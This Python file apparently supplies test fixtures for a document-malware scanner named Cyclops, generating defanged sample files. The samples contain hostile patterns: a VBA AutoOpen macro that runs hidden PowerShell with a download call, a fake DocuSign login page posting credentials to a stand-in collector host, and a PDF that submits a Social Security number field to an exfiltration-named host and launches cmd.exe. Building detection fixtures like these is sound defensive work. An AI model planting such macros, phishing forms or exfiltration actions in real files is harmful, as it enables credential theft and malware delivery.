"""
Controlled Test and Demo Fixtures for Cyclops Document Scanner.
Provides realistic, benign file byte fixtures representing suspicious structures
for automated testing and demonstration.
"""
import io
import zipfile

def get_fixture_bytes(file_name: str) -> bytes:
    """
    Returns synthetic benign file bytes matching the filename's profile.
    Never contains actual malware.
    """
    fn = file_name.lower()

    if "exe" in fn or fn.endswith(".exe"):
        # Benign stub with PE header signature
        return b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\r\n$"

    if "xlsm" in fn or "macro" in fn:
        # Build synthetic OOXML ZIP with vbaProject.bin containing macro indicator strings
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
            zf.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
            zf.writestr("xl/workbook.xml", '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Report" sheetId="1" r:id="rId1"/></sheets></workbook>')
            # Synthetic VBA project bytes with benign suspicious strings
            vba_dummy = (
                b"VBA_Project\x00"
                b"Sub AutoOpen()\n"
                b'  Dim sh: Set sh = CreateObject("WScript.Shell")\n'
                b'  sh.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command URLDownloadToFile"\n'
                b'  Dim tempDir: tempDir = Environ("TEMP")\n'
                b"End Sub\n"
            )
            zf.writestr("xl/vbaProject.bin", vba_dummy)
            zf.writestr("xl/sharedStrings.xml", '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2"><si><t>Quarterly Financial Results 2026</t></si><si><t>Internal Revenue Statement</t></si></sst>')
        return buf.getvalue()

    if "html" in fn or "htm" in fn or "docusign" in fn or "envelope" in fn:
        return (
            b"<!DOCTYPE html>\n"
            b"<html>\n"
            b"<head>\n"
            b"  <title>DocuSign - Review and Sign Document</title>\n"
            b"</head>\n"
            b"<body>\n"
            b"  <h2>DocuSign Identity Verification</h2>\n"
            b'  <form action="https://external-auth-collector.ru/login/collect" method="POST">\n'
            b'    <label>Email Address:</label><input type="email" name="login_email" />\n'
            b'    <label>Account Password:</label><input type="password" name="user_password" />\n'
            b'    <button type="submit">Verify Identity</button>\n'
            b"  </form>\n"
            b'  <iframe src="https://tracking-hub.biz/embed" style="display:none;width:0;height:0"></iframe>\n'
            b"  <script>\n"
            b'    eval(unescape("%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e"));\n'
            b"  </script>\n"
            b"</body>\n"
            b"</html>\n"
        )

    if "financial" in fn or "audit" in fn or "form" in fn:
        # PDF with AcroForm, /SubmitForm, and /Launch action
        return (
            b"%PDF-1.7\n"
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>\n"
            b"endobj\n"
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>\n"
            b"endobj\n"
            b"4 0 obj\n"
            b"<< /Fields [6 0 R] /DA (/Helv 0 Tf 0 g) >>\n"
            b"endobj\n"
            b"5 0 obj\n"
            b"<< /Length 180 >>\n"
            b"stream\n"
            b"BT /F1 12 Tf 50 700 Td (Annual Financial Audit Report) Tj ET\n"
            b"3 Tr BT /F1 0.5 Tf 100 650 Td (HIDDEN_ADMIN_OVERRIDE_TOKEN) Tj ET\n"
            b"endstream\n"
            b"endobj\n"
            b"6 0 obj\n"
            b"<< /FT /Tx /T (ssn_tax_id) /TU (Social Security Number) /A << /S /SubmitForm /F (https://exfiltration-audit.org/post) >> >>\n"
            b"endobj\n"
            b"7 0 obj\n"
            b"<< /S /Launch /F (cmd.exe /c echo SuspiciousLaunch) >>\n"
            b"endobj\n"
            b"xref\n"
            b"0 8\n"
            b"0000000000 65535 f \n"
            b"trailer\n"
            b"<< /Size 8 /Root 1 0 R >>\n"
            b"startxref\n"
            b"600\n"
            b"%%EOF\n"
        )

    # Standard clean PDF
    return (
        b"%PDF-1.7\n"
        b"1 0 obj\n"
        b"<< /Type /Catalog /Pages 2 0 R >>\n"
        b"endobj\n"
        b"2 0 obj\n"
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
        b"endobj\n"
        b"3 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
        b"endobj\n"
        b"4 0 obj\n"
        b"<< /Length 120 >>\n"
        b"stream\n"
        b"BT /F1 14 Tf 50 720 Td (Cyclops Information Security Policy 2026) Tj ET\n"
        b"BT /F1 10 Tf 50 690 Td (All organizational data is encrypted at rest and in transit.) Tj ET\n"
        b"endstream\n"
        b"endobj\n"
        b"xref\n"
        b"0 5\n"
        b"0000000000 65535 f \n"
        b"trailer\n"
        b"<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n"
        b"400\n"
        b"%%EOF\n"
    )
